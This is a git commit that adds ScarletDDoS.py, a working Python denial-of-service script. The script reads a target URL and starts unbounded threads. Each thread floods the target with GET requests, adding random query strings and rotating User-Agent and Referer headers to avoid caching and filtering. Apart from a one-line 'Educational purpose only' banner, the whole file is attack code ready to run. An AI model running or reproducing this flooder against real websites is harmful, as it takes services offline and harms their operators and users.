4f9808fffaefeb79f28672c477ce68a1266dd307
Alessio DS <digialessio63@gmail.com>
2022-03-03 18:03:59 +0100

    Create ScarletDDoS.py

---
+++ ScarletDDoS.py
@@ -0,0 +1,85 @@
+import os
+import requests
+import threading
+import random
+
+########################################
+#       Educational purpose only       #
+########################################
+
+if os.name == 'nt':
+    os.system("cls")
+else:
+    os.system("clear")
+
+
+url = input("URL:  ").strip()
+
+
+count = 0
+headers = []
+referer = [
+    "https://google.it/",
+    "https://facebook.com/",
+    "https://duckduckgo.com/",
+    "https://google.com/",
+    "https://youtube.com",
+    "https://yandex.com",
+]
+
+
+def useragent():
+    global headers
+    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
+    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
+    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
+    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
+    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
+    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
+
+    return headers
+
+
+def genstr(size):
+    out_str = ''
+
+    for _ in range(0, size):
+        code = random.randint(65, 90)
+        out_str += chr(code)
+    
+    return out_str
+
+
+class httpth1(threading.Thread):
+    def run(self):
+        global count
+        while True:
+            try:
+                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
+                randomized_url = url + "?" + genstr(random.randint(3, 10))
+                requests.get(randomized_url, headers=headers)
+                count += 1
+                print ("{0} ScarletDDoS Sent".format(count))
+            except requests.exceptions.ConnectionError:
+                print ("[Server might be down!]")
+                pass
+            except requests.exceptions.InvalidSchema:
+                print ("[URL Error]")
+                raise SystemExit()
+            except ValueError:
+                print ("[Check Your URL]")
+                raise SystemExit()
+            except KeyboardInterrupt:
+                print("[Canceled by User]")
+                raise SystemExit()
+
+
+while True:
+    try:
+        th1 = httpth1()
+        th1.start()
+    except Exception:
+        pass
+    except KeyboardInterrupt:
+        exit("[Canceled By User]")
+        raise SystemExit()
